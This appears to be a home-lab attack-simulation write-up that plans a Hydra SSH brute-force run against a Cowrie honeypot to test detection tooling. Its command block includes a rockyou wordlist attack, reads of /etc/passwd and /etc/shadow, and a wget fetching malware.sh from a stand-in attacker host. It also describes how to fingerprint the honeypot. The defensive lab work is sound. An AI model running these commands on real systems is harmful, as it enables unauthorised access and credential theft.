# Scenario 2: Credential Brute Force

## Summary

Hydra-based SSH brute force attack against the Cowrie SSH honeypot on Pi 3B+. This scenario demonstrates threat intelligence collection — Cowrie captures full attacker sessions including every credential tried, every command executed post-login, and every file download attempted. It also tests whether the detection stack catches the brute force pattern at the network layer.

## MITRE ATT&CK

| Field | Value |
|-------|-------|
| Technique ID | T1110.001 |
| Technique Name | Brute Force: Password Guessing |
| Tactic | Credential Access |

## Attack Details

| Field | Value |
|-------|-------|
| Tools | Hydra (Kali Linux VM, ThinkPad, guest WiFi) |
| Target | Cowrie SSH honeypot on Pi 3B+ — port 22 |
| Wordlist | /usr/share/wordlists/rockyou.txt |
| Purpose | Demonstrate threat intelligence collection. Full attacker session logging. |

## Commands Executed

```bash
# Dictionary attack against SSH (Cowrie):
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.20 -t 4 -V

# After Hydra finds 'accepted' credentials, SSH in manually:
ssh root@192.168.1.20    # Cowrie accepts — fake shell

# Simulate post-compromise attacker behaviour in fake shell:
whoami
uname -a
cat /etc/passwd
cat /etc/shadow
ls /home
wget http://evil-example.com/malware.sh    # Cowrie logs the download attempt
```

## Detection Evidence

### Suricata
> *To be populated after execution — expected: ET SCAN SSH BruteForce signature*

### Zeek
> *To be populated after execution — expected: conn.log showing high-volume SSH connection attempts*

### Wazuh
> *To be populated after execution — expected: Cowrie JSON events forwarded via agent, brute force correlation*

### Claude AI Classification
> *To be populated after execution — expected: Medium (brute force attempt) escalating to Critical (successful login + post-exploitation)*

```json
{
  "severity": "<to be populated>",
  "summary": "<to be populated>",
  "mitre_technique": "T1110.001",
  "mitre_technique_name": "Brute Force: Password Guessing",
  "recommended_action": "<to be populated>",
  "confidence": 0.0,
  "reasoning": "<to be populated>"
}
```

### Operator Alert (Telegram)
> *Screenshot to be added after execution*

### Velociraptor
> *N/A — no real endpoint compromise (Cowrie is a honeypot)*

## Detection Gaps

### Honeypot Fingerprinting
Sophisticated attackers can identify Cowrie via timing anomalies, filesystem inconsistencies, or banner analysis. If they identify and avoid the honeypot, pivoting to port 2222 (real SSH) is not captured by Cowrie. Suricata, Zeek, and Wazuh auth logs must cover the real SSH path.

### Scope Limitation
Cowrie only captures what hits port 22. Post-compromise activity targeting other hosts from a real compromise is outside Cowrie's visibility.

## Lessons Learned

> *To be populated after execution*
